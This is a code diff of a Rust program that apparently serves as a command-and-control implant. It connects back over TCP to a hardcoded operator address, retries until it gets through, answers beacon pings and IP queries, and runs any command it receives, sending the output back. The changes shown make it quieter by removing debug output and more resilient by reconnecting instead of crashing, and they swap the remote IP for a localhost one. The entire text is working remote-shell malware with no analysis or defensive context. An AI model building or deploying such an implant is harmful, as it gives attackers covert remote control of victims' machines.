@@ -3,11 +3,11 @@ use std::net::TcpStream;
 use std::io::Write;
 use std::io::Read;
 use std::process::Command;
-// use local_ip_address::local_ip;
+use local_ip_address::local_ip;
 use std::{thread, time};
 use std::path::Path;
 use std::env::set_current_dir;
-use std::process::Output;
+// use std::process::Output;
 use subprocess::Exec;
 
 //TODO 
@@ -21,7 +21,7 @@ fn connect(ip: &str) -> TcpStream {
                 return con;
             },
             Err(_) => { //if it errored, print that it is trying to connect and re-loop
-                println!("trying to connect");
+                // println!("trying to connect");
                 thread::sleep(time::Duration::from_millis(2000));
                 continue;
             }
@@ -40,27 +40,23 @@ fn run_command(cmd: &str) -> String {
 }
 
 
-fn c2() {
-    let ip = "129.21.49.57:5678";
+fn c2(ip:&str) {
     let mut stream = connect(ip); //connects via TCP
     loop {
         let mut buffer = [0;1024]; //set the buffer
-        println!("reading buffer");
-        let num_of_bytes = stream.read(&mut buffer).expect("buffer not read"); //TODO will throw a connecfion reset by peer error, catch it
+        let num_of_bytes = stream.read(&mut buffer).unwrap_or(0);
         if num_of_bytes == 0 { //if the connection is lost
-            println!("bytes is 0, resetting");
             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
             stream = connect(ip); //connect again
             continue; //continue the loop
         }
         let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
-        println!("good to go, running cmd: {}", recv);
         if recv.contains("getIP") { //if it's getIP, return the IP
-            let local_ip = local_ip().unwrap(); //get the local IP
-            let local_ip = format!("{}\n",local_ip); //format IP into string
-            let local_ip = local_ip.as_bytes();
-            // let local_ip = "10.1.1.1".as_bytes();
-            stream.write(&local_ip).unwrap(); //send it
+            // let local_ip = local_ip().unwrap(); //get the local IP
+            // let local_ip = format!("{}\n",local_ip); //format IP into string
+            // let local_ip = local_ip.as_bytes();
+            // stream.write(&local_ip).unwrap(); //send it
+            stream.write(b"10.1.1.1");
             continue;
         }
         if recv.len() > 2{
@@ -81,21 +77,18 @@ fn c2() {
                 }.as_bytes(),).unwrap();
                 continue;
             } else if recv.eq("beacon_ping"){
-                println!("sent pong");
                 stream.write(b"beacon_pong").unwrap();
                 continue;
             }
         }
-        println!("Command: {}",&recv);
         let output = run_command(&recv); //run this
-        // // let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
-        // println!("Output: {}",stderrout);
         stream.write(&output.as_bytes()).unwrap(); //send that shit
     }
-    // stream.shutdown(Shutdown::Both).expect("shutdown call failed");
 }       
 
 
 fn main(){
-    c2();
+    // let ip = "129.21.49.57:5678";
+    let ip = "127.0.0.1:8080";
+    c2(&ip);
 }
